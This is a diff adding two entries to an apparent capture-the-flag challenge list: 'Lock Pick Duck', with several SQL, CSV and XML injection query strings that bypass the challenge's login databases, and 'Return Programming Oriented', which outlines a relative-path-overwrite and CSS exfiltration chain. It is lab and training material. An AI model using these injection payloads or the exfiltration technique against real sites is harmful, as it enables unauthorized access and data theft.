@@ -18,3 +18,37 @@ Solved: 1 / ??
 
 ### Write-ups
 http://blog.samueltang.net/archives/382
+
+
+
+## Lock Pick Duck
+
+[Source code](2018/LockPickDuck)
+* Partially solved:  5 / 17
+* Completely solved: 0 / 17
+
+### Description
+
+* Summary: One injection payload breaks in six databases
+* `?username=|&password` breaks csvdb1
+* `?username=%27or+1--&password` breaks sqldb1
+* `?username=&password=%27or%271` breaks sqldb1 and xmldb1
+* `?username=()|&password` breaks csvdb1 and csvdb2
+* `?username=%27union%20select%20%27A%27--&password=A` breaks sqldb1 and sqldb2
+* `?username&password=A` breaks xmldb2
+* Good luck
+
+
+
+### Return Programming Oriented
+
+[Source code](2018/ReturnProgrammingOriented)
+
+Solved: 0 / 17
+
+* Summary: RPO + CSS Exfil
+* Buggy rewrite rule got RPO by adding &
+* `$_GET['ln']` can redirect internal webpages or show reflective warning message when the URL is external website 
+* Show flag in the ads using redirect
+* CSS payload goes to style.css using warning message
+* **No one plays, no write ups**
